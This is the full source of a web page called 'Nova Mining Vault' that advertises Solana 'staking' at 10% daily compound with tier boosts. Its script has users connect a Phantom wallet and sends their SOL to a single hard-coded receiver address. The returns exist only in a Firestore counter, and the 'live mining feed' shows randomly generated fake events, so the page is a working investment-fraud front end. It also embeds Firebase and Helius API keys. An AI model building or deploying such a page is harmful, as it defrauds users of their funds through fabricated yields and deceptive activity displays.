<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>NOVA MINING VAULT | Smart SOL Staking</title>
    <!-- Font & Icons -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            min-height: 100vh;
            background: radial-gradient(circle at 0% 0%, #1a2f3f, #0b1a2a, #030b14);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }

        .glass-panel {
            width: 100%;
            max-width: 650px;
            background: rgba(10, 22, 35, 0.3);
            backdrop-filter: blur(15px) saturate(180%);
            -webkit-backdrop-filter: blur(15px) saturate(180%);
            border: 1px solid rgba(0, 255, 255, 0.15);
            border-radius: 3rem;
            padding: 2rem 1.8rem;
            box-shadow: 0 30px 60px -15px rgba(0, 0, 0, 0.8), inset 0 0 30px rgba(0, 255, 255, 0.05);
        }

        /* Mining header with animated gradient */
        .mining-header {
            text-align: center;
            margin-bottom: 2rem;
            position: relative;
        }

        .mining-header h1 {
            font-size: 2.2rem;
            font-weight: 700;
            background: linear-gradient(135deg, #7fdbff, #64b5f6, #00bcd4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
            letter-spacing: 2px;
        }

        .mining-header p {
            color: #8bb9ff;
            font-size: 0.9rem;
            opacity: 0.8;
        }

        .glassy-block {
            background: rgba(8, 25, 40, 0.5);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(0, 200, 255, 0.2);
            border-radius: 2rem;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            box-shadow: 0 15px 35px -10px rgba(0, 0, 0, 0.6);
            transition: all 0.3s ease;
        }

        .glassy-block:hover {
            border-color: rgba(0, 255, 255, 0.4);
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.1);
        }

        .wallet-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 1rem;
        }

        .wallet-badge {
            display: flex;
            align-items: center;
            gap: 10px;
            background: rgba(0, 255, 255, 0.1);
            padding: 0.5rem 1.2rem;
            border-radius: 3rem;
            border: 1px solid rgba(0, 255, 255, 0.3);
        }

        .wallet-address {
            font-size: 0.9rem;
            background: rgba(0, 0, 0, 0.4);
            padding: 0.6rem 1.2rem;
            border-radius: 3rem;
            border: 1px solid rgba(0, 255, 255, 0.2);
            color: #a5f0ff;
            font-family: monospace;
            letter-spacing: 1px;
        }

        .btn {
            background: rgba(0, 150, 255, 0.15);
            border: 1px solid rgba(0, 255, 255, 0.4);
            color: white;
            padding: 0.8rem 2rem;
            border-radius: 3rem;
            font-weight: 600;
            font-size: 0.95rem;
            cursor: pointer;
            backdrop-filter: blur(4px);
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(0, 100, 255, 0.2);
            display: inline-flex;
            align-items: center;
            gap: 0.8rem;
            -webkit-tap-highlight-color: transparent;
        }

        .btn-primary {
            background: linear-gradient(135deg, rgba(0, 200, 255, 0.3), rgba(0, 100, 255, 0.3));
            border-color: #00ffff;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }

        .btn-primary:active {
            transform: scale(0.97);
        }

        /* Mining stats with cool effects */
        .mining-stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 1rem;
            margin: 1.5rem 0;
        }

        .stat-card {
            background: rgba(0, 20, 40, 0.6);
            border-radius: 1.5rem;
            padding: 1.2rem;
            text-align: center;
            border: 1px solid rgba(0, 255, 200, 0.2);
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(0, 255, 255, 0.1), transparent 70%);
            opacity: 0;
            transition: opacity 0.5s;
        }

        .stat-card:hover::before {
            opacity: 1;
        }

        .stat-icon {
            font-size: 1.8rem;
            color: #00ffff;
            margin-bottom: 0.5rem;
            text-shadow: 0 0 20px cyan;
        }

        .stat-value {
            font-size: 1.8rem;
            font-weight: 700;
            color: white;
            line-height: 1.2;
            text-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
        }

        .stat-label {
            font-size: 0.8rem;
            color: #8dd0ff;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        /* Mining power bar */
        .mining-power {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 2rem;
            padding: 1rem;
            margin: 1rem 0;
        }

        .power-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.5rem;
            color: #9fc5ff;
        }

        .power-bar {
            width: 100%;
            height: 20px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 1rem;
            overflow: hidden;
            border: 1px solid rgba(0, 255, 255, 0.3);
        }

        .power-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00ffaa, #00ffff, #0088ff);
            border-radius: 1rem;
            transition: width 0.5s ease;
            box-shadow: 0 0 20px cyan;
        }

        /* Boost indicators */
        .boost-badge {
            display: inline-block;
            background: rgba(255, 215, 0, 0.2);
            border: 1px solid gold;
            border-radius: 2rem;
            padding: 0.3rem 1rem;
            font-size: 0.8rem;
            color: gold;
            margin-right: 0.5rem;
        }

        .boost-active {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 0.6; }
            50% { opacity: 1; text-shadow: 0 0 15px gold; }
            100% { opacity: 0.6; }
        }

        /* Live mining feed */
        .mining-feed {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 1.5rem;
            padding: 1rem;
            max-height: 120px;
            overflow-y: auto;
            font-size: 0.85rem;
            border: 1px solid rgba(0, 255, 255, 0.2);
        }

        .feed-item {
            padding: 0.3rem 0;
            color: #b0e0ff;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .feed-item i {
            font-size: 0.7rem;
            color: #00ffaa;
        }

        /* Tier badges */
        .tier-badge {
            background: linear-gradient(135deg, #ffd700, #ffb347);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
        }

        @media (max-width: 480px) {
            .glass-panel {
                padding: 1.5rem 1rem;
            }
            
            .mining-stats-grid {
                grid-template-columns: 1fr;
            }
            
            .wallet-row {
                flex-direction: column;
            }
            
            .btn {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="glass-panel">
        <!-- Mining Header -->
        <div class="mining-header">
            <h1>âš¡ NOVA MINING âš¡</h1>
            <p>next-gen solana staking â€¢ 10% daily â€¢ instant rewards</p>
        </div>

        <!-- Wallet Section -->
        <div class="glassy-block">
            <div class="wallet-row">
                <div class="wallet-badge">
                    <i class="fas fa-bolt" style="color: #00ffff;"></i>
                    <span style="font-weight: 600;">PHANTOM MINER</span>
                </div>
                <button class="btn" id="connectWalletBtn">
                    <i class="fab fa-phantom"></i> CONNECT RIG
                </button>
            </div>
            <div id="walletInfo" style="display: none; margin-top: 1.5rem;">
                <div style="display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;">
                    <div class="wallet-address" id="walletAddressDisplay"></div>
                    <span style="color: #00ffaa; font-size: 0.9rem;">
                        <i class="fas fa-circle"></i> mining active
                    </span>
                </div>
            </div>
        </div>

        <!-- Mining Dashboard -->
        <div class="glassy-block">
            <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 1rem;">
                <i class="fas fa-microchip" style="color: #00ffff; font-size: 1.5rem;"></i>
                <span style="font-weight: 600; font-size: 1.2rem;">MINING DASHBOARD</span>
                <span class="boost-badge" id="boostIndicator">ðŸš€ NO BOOST</span>
            </div>

            <!-- Mining Stats Cards -->
            <div class="mining-stats-grid">
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-coins"></i></div>
                    <div class="stat-value" id="totalStakedDisplay">0.00</div>
                    <div class="stat-label">STAKED SOL</div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-chart-line"></i></div>
                    <div class="stat-value" id="dailyRewardDisplay">0.000</div>
                    <div class="stat-label">DAILY REWARD</div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-clock"></i></div>
                    <div class="stat-value" id="miningSpeed">0.00</div>
                    <div class="stat-label">SOL/HR</div>
                </div>
            </div>

            <!-- Mining Power Bar -->
            <div class="mining-power">
                <div class="power-header">
                    <span><i class="fas fa-bolt"></i> MINING POWER</span>
                    <span id="powerPercentage">0%</span>
                </div>
                <div class="power-bar">
                    <div class="power-fill" id="powerFill" style="width: 0%;"></div>
                </div>
            </div>

            <!-- Tier & Progress -->
            <div style="display: flex; justify-content: space-between; align-items: center; margin: 1rem 0;">
                <div>
                    <span style="color: #9fc5ff;">MINER TIER:</span>
                    <span class="tier-badge" id="minerTier">BRONZE</span>
                </div>
                <div>
                    <span style="color: #9fc5ff;">NEXT TIER:</span>
                    <span id="nextTierProgress">0/10 SOL</span>
                </div>
            </div>

            <!-- Stake Controls -->
            <div style="margin: 1.5rem 0;">
                <div style="display: flex; gap: 0.5rem; align-items: center; margin-bottom: 0.5rem;">
                    <i class="fas fa-cube"></i>
                    <span>AMOUNT TO MINE</span>
                </div>
                <div class="input-group" style="display: flex; gap: 0.5rem;">
                    <input type="number" id="stakeAmount" placeholder="0.0" min="0.01" step="0.01" value="0.1">
                    <span>SOL</span>
                </div>
                <div style="display: flex; gap: 0.5rem; margin-top: 1rem;">
                    <button class="btn btn-primary" id="stakeBtn" style="flex: 2;">
                        <i class="fa-solid fa-arrow-up-from-bracket"></i> START MINING
                    </button>
                    <button class="btn" id="quickStake1" style="flex: 1;">0.5</button>
                    <button class="btn" id="quickStake2" style="flex: 1;">1.0</button>
                </div>
            </div>

            <!-- Live Mining Feed -->
            <div style="margin-top: 1.5rem;">
                <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
                    <span><i class="fas fa-rss"></i> LIVE MINING FEED</span>
                    <span id="hashRate" style="color: #00ffaa;">âš¡ 0 H/s</span>
                </div>
                <div class="mining-feed" id="miningFeed">
                    <div class="feed-item">
                        <i class="fas fa-play"></i> system online Â· waiting for miner...
                    </div>
                </div>
            </div>

            <!-- Last Update -->
            <div style="display: flex; justify-content: space-between; font-size: 0.85rem; margin-top: 1rem; padding-top: 1rem; border-top: 1px solid rgba(0,255,255,0.2);">
                <span><i class="fa-regular fa-calendar"></i> LAST MINING CYCLE</span>
                <span id="lastUpdateTimestamp">â€”</span>
            </div>
        </div>

        <!-- Footer -->
        <div style="text-align: center; opacity: 0.6; font-size: 0.7rem;">
            <i class="fa-regular fa-gem"></i> mining pool: AMC3gY5q...JyeJc Â· 10% daily compound
        </div>
    </div>

    <!-- MODAL -->
    <div class="modal-overlay" id="txModal">
        <div class="modal-card">
            <div class="modal-header">
                <i class="fa-solid fa-bolt" style="color: #00ffff;"></i> MINING TRANSACTION
            </div>
            <div id="modalMessage" style="margin-bottom: 0.8rem;">processing...</div>
            <div class="modal-detail" id="modalDetail"></div>
            <div class="flex-row">
                <button class="btn" id="modalCloseBtn">CLOSE</button>
            </div>
        </div>
    </div>

    <!-- FIREBASE + PHANTOM + HELIUS -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCck4gA4cLcJfir9nJAigdZrVC8r91gciE",
            authDomain: "nova-e6655.firebaseapp.com",
            databaseURL: "https://nova-e6655-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "nova-e6655",
            storageBucket: "nova-e6655.firebasestorage.app",
            messagingSenderId: "111451913127",
            appId: "1:111451913127:web:8cb6c4f1715daf0ff69482"
        };
        
        const fbApp = initializeApp(firebaseConfig);
        const db = getFirestore(fbApp);

        const RECEIVER_ADDRESS = "AMC3gY5qJxxF6sNcPzzsmFvpucJJvBydLCiZggaJyeJc";
        const HELIUS_RPC = "https://mainnet.helius-rpc.com/?apiKey=a6328d07-7441-42c2-afb0-3bcd6a932c17";
        
        let phantom = null;
        let walletAddress = null;
        let userDocRef = null;
        let miningInterval = null;
        let feedItems = [];

        // UI Elements
        const connectBtn = document.getElementById('connectWalletBtn');
        const walletInfoDiv = document.getElementById('walletInfo');
        const walletAddrSpan = document.getElementById('walletAddressDisplay');
        const stakeBtn = document.getElementById('stakeBtn');
        const stakeAmountInput = document.getElementById('stakeAmount');
        const totalStakedSpan = document.getElementById('totalStakedDisplay');
        const dailyRewardSpan = document.getElementById('dailyRewardDisplay');
        const miningSpeedSpan = document.getElementById('miningSpeed');
        const powerFill = document.getElementById('powerFill');
        const powerPercentage = document.getElementById('powerPercentage');
        const minerTierSpan = document.getElementById('minerTier');
        const nextTierProgress = document.getElementById('nextTierProgress');
        const boostIndicator = document.getElementById('boostIndicator');
        const hashRateSpan = document.getElementById('hashRate');
        const miningFeed = document.getElementById('miningFeed');
        const lastUpdateSpan = document.getElementById('lastUpdateTimestamp');
        const modalOverlay = document.getElementById('txModal');
        const modalMessage = document.getElementById('modalMessage');
        const modalDetail = document.getElementById('modalDetail');
        const modalClose = document.getElementById('modalCloseBtn');

        // Quick stake buttons
        const quickStake1 = document.getElementById('quickStake1');
        const quickStake2 = document.getElementById('quickStake2');

        function showModal(title, detail) {
            modalMessage.innerText = title;
            modalDetail.innerText = detail;
            modalOverlay.classList.add('show');
        }

        modalClose.addEventListener('click', () => {
            modalOverlay.classList.remove('show');
        });

        function formatAddr(addr) {
            return addr ? addr.slice(0,4) + '..' + addr.slice(-4) : '';
        }

        function getPhantom() {
            if (window?.phantom?.solana) return window.phantom.solana;
            if (window?.solana?.isPhantom) return window.solana;
            return null;
        }

        // Add to mining feed
        function addToFeed(message, type = 'info') {
            const icons = {
                success: 'check-circle',
                mining: 'bolt',
                info: 'circle',
                warning: 'exclamation-triangle'
            };
            
            feedItems.unshift({ message, type, time: new Date() });
            if (feedItems.length > 5) feedItems.pop();
            
            updateFeed();
        }

        function updateFeed() {
            miningFeed.innerHTML = feedItems.map(item => `
                <div class="feed-item">
                    <i class="fas fa-${icons[item.type] || 'circle'}" style="color: ${item.type === 'success' ? '#00ffaa' : item.type === 'mining' ? '#ffff00' : '#00ffff'};"></i>
                    ${item.message}
                </div>
            `).join('');
        }

        const icons = {
            success: 'check-circle',
            mining: 'bolt',
            info: 'circle',
            warning: 'exclamation-triangle'
        };

        // Calculate mining stats
        function updateMiningStats(totalStaked) {
            // Mining power (0-100%)
            const powerLevel = Math.min(100, (totalStaked / 50) * 100);
            powerFill.style.width = `${powerLevel}%`;
            powerPercentage.innerText = `${Math.round(powerLevel)}%`;
            
            // Mining speed (SOL per hour)
            const hourlyRate = (totalStaked * 0.1) / 24;
            miningSpeedSpan.innerText = hourlyRate.toFixed(4);
            
            // Hash rate simulation
            const hashRate = Math.round(totalStaked * 100);
            hashRateSpan.innerText = `âš¡ ${hashRate} H/s`;
            
            // Miner tier
            let tier = 'BRONZE';
            let nextTier = 10;
            if (totalStaked >= 100) {
                tier = 'DIAMOND';
                boostIndicator.innerHTML = 'ðŸ’Ž 2.5x BOOST';
                boostIndicator.style.borderColor = '#b9f2ff';
            } else if (totalStaked >= 50) {
                tier = 'PLATINUM';
                boostIndicator.innerHTML = 'ðŸ”· 2.0x BOOST';
                boostIndicator.style.borderColor = '#e5e4e2';
            } else if (totalStaked >= 25) {
                tier = 'GOLD';
                boostIndicator.innerHTML = 'â­ 1.5x BOOST';
                boostIndicator.style.borderColor = 'gold';
            } else if (totalStaked >= 10) {
                tier = 'SILVER';
                boostIndicator.innerHTML = 'âšª 1.2x BOOST';
                boostIndicator.style.borderColor = 'silver';
            } else {
                boostIndicator.innerHTML = 'ðŸª™ NO BOOST';
            }
            
            minerTierSpan.innerText = tier;
            minerTierSpan.className = 'tier-badge';
            
            // Next tier progress
            if (tier === 'BRONZE') nextTierProgress.innerText = `${totalStaked.toFixed(2)}/10 SOL`;
            else if (tier === 'SILVER') nextTierProgress.innerText = `${totalStaked.toFixed(2)}/25 SOL`;
            else if (tier === 'GOLD') nextTierProgress.innerText = `${totalStaked.toFixed(2)}/50 SOL`;
            else if (tier === 'PLATINUM') nextTierProgress.innerText = `${totalStaked.toFixed(2)}/100 SOL`;
            else nextTierProgress.innerText = 'MAX TIER';
        }

        // Firestore functions
        async function initUserDoc(address) {
            if (!address) return;
            const docId = address.slice(0,42);
            userDocRef = doc(db, 'stakes', docId);
            
            const snap = await getDoc(userDocRef);
            const now = Date.now();
            
            if (!snap.exists()) {
                await setDoc(userDocRef, {
                    wallet: address,
                    totalStaked: 0,
                    lastDailyUpdate: now,
                    createdAt: serverTimestamp()
                });
                addToFeed('ðŸš€ new mining rig initialized', 'success');
            } else {
                const data = snap.data();
                let total = data.totalStaked || 0;
                const lastUpdate = data.lastDailyUpdate || now;
                const daysPassed = Math.floor((now - lastUpdate) / (86400 * 1000));
                
                // Apply tier boost
                let boostMultiplier = 1.0;
                if (total >= 100) boostMultiplier = 2.5;
                else if (total >= 50) boostMultiplier = 2.0;
                else if (total >= 25) boostMultiplier = 1.5;
                else if (total >= 10) boostMultiplier = 1.2;
                
                if (daysPassed > 0 && total > 0) {
                    const dailyRate = 0.1 * boostMultiplier;
                    for (let i = 0; i < daysPassed; i++) {
                        total = total * (1 + dailyRate);
                    }
                    await updateDoc(userDocRef, {
                        totalStaked: total,
                        lastDailyUpdate: now
                    });
                    addToFeed(`â›ï¸ mined ${daysPassed} day(s) with ${boostMultiplier}x boost`, 'mining');
                }
            }
            await refreshUserStats();
        }

        async function refreshUserStats() {
            if (!userDocRef) return;
            const snap = await getDoc(userDocRef);
            if (!snap.exists()) return;
            const data = snap.data();
            const total = data.totalStaked || 0;
            const last = data.lastDailyUpdate ? new Date(data.lastDailyUpdate).toLocaleString() : 'just now';
            
            // Apply tier boost for display
            let boostMultiplier = 1.0;
            if (total >= 100) boostMultiplier = 2.5;
            else if (total >= 50) boostMultiplier = 2.0;
            else if (total >= 25) boostMultiplier = 1.5;
            else if (total >= 10) boostMultiplier = 1.2;
            
            const dailyRate = 0.1 * boostMultiplier;
            const dailyReward = total * dailyRate;
            
            totalStakedSpan.innerText = total.toFixed(4);
            dailyRewardSpan.innerText = dailyReward.toFixed(4);
            lastUpdateSpan.innerText = last;
            
            updateMiningStats(total);
        }

        async function addStakeToFirestore(amountSol) {
            if (!userDocRef || !walletAddress) return;
            const snap = await getDoc(userDocRef);
            if (!snap.exists()) return;
            const currentTotal = snap.data().totalStaked || 0;
            const newTotal = currentTotal + amountSol;
            await updateDoc(userDocRef, {
                totalStaked: newTotal,
                lastDailyUpdate: Date.now()
            });
            await refreshUserStats();
            addToFeed(`ðŸ“¦ +${amountSol} SOL added to mining rig`, 'success');
        }

        // Connect Phantom
        async function connectPhantom() {
            phantom = getPhantom();
            
            if (!phantom) {
                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
                if (isMobile) {
                    if (confirm("Open Phantom app to start mining?")) {
                        window.location.href = "phantom://browse";
                        setTimeout(() => {
                            window.location.href = "https://phantom.app/ul/browse";
                        }, 1000);
                    }
                } else {
                    window.open("https://phantom.app/", "_blank");
                    alert("Install Phantom wallet to start mining");
                }
                return;
            }

            try {
                const resp = await phantom.connect();
                walletAddress = resp.publicKey.toString();
                
                walletAddrSpan.innerText = formatAddr(walletAddress);
                walletInfoDiv.style.display = 'block';
                connectBtn.innerHTML = '<i class="fas fa-check"></i> MINING ACTIVE';
                connectBtn.style.background = 'rgba(0, 255, 100, 0.2)';
                connectBtn.disabled = true;
                
                await initUserDoc(walletAddress);
                addToFeed('ðŸ”Œ mining rig connected to network', 'success');
                
                // Start live mining simulation
                startMiningSimulation();
                
            } catch (err) {
                console.error('Connection error:', err);
                alert('Failed to connect: ' + err.message);
            }
        }

        // Send stake transaction
        async function sendStake(amount = null) {
            if (!walletAddress || !phantom) {
                alert("Connect mining rig first");
                return;
            }

            const stakeAmount = amount || parseFloat(stakeAmountInput.value);
            if (isNaN(stakeAmount) || stakeAmount < 0.01) {
                alert("Minimum stake 0.01 SOL");
                return;
            }

            showModal("â›ï¸ MINING TRANSACTION", `Adding ${stakeAmount} SOL to mining rig...`);

            try {
                if (!phantom.publicKey) {
                    await phantom.connect();
                }

                const connection = new solanaWeb3.Connection(HELIUS_RPC, 'confirmed');
                const { blockhash } = await connection.getLatestBlockhash();

                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: phantom.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(RECEIVER_ADDRESS),
                        lamports: stakeAmount * solanaWeb3.LAMPORTS_PER_SOL
                    })
                );
                
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = phantom.publicKey;

                const signed = await phantom.signTransaction(transaction);
                const txid = await connection.sendRawTransaction(signed.serialize());
                
                modalMessage.innerText = "âœ… MINING ACTIVE!";
                modalDetail.innerText = `TX: ${txid.slice(0,16)}... | ${stakeAmount} SOL added`;
                
                await addStakeToFirestore(stakeAmount);
                await connection.confirmTransaction(txid, 'confirmed');
                
                addToFeed(`â›ï¸ mining started with ${stakeAmount} SOL`, 'mining');
                
            } catch (err) {
                console.error('Transaction error:', err);
                modalMessage.innerText = "âŒ mining failed";
                modalDetail.innerText = err.message || 'Transaction rejected';
                addToFeed('âš ï¸ mining transaction failed', 'warning');
            }
        }

        // Mining simulation
        function startMiningSimulation() {
            if (miningInterval) clearInterval(miningInterval);
            
            miningInterval = setInterval(async () => {
                if (!userDocRef || !walletAddress) return;
                
                // Random mining events
                const events = [
                    'âš¡ hash rate stabilizing',
                    'ðŸ” validating block',
                    'ðŸ“Š calculating rewards',
                    'ðŸ’Ž gem found!',
                    'ðŸ”„ syncing with network',
                    'âš™ï¸ optimizing miner'
                ];
                
                if (Math.random() > 0.7) {
                    const randomEvent = events[Math.floor(Math.random() * events.length)];
                    addToFeed(randomEvent, 'mining');
                }
                
                await refreshUserStats();
            }, 8000);
        }

        // Event listeners
        connectBtn.addEventListener('click', connectPhantom);
        stakeBtn.addEventListener('click', () => sendStake());
        quickStake1.addEventListener('click', () => sendStake(0.5));
        quickStake2.addEventListener('click', () => sendStake(1.0));

        // Auto-connect
        window.addEventListener('load', async () => {
            phantom = getPhantom();
            if (phantom?.isConnected && phantom.publicKey) {
                walletAddress = phantom.publicKey.toString();
                walletAddrSpan.innerText = formatAddr(walletAddress);
                walletInfoDiv.style.display = 'block';
                connectBtn.innerHTML = '<i class="fas fa-check"></i> MINING ACTIVE';
                connectBtn.style.background = 'rgba(0, 255, 100, 0.2)';
                connectBtn.disabled = true;
                await initUserDoc(walletAddress);
                startMiningSimulation();
                addToFeed('ðŸ”„ mining rig resumed', 'success');
            }
        });
    </script>
    
    <script src="https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
</body>
</html>
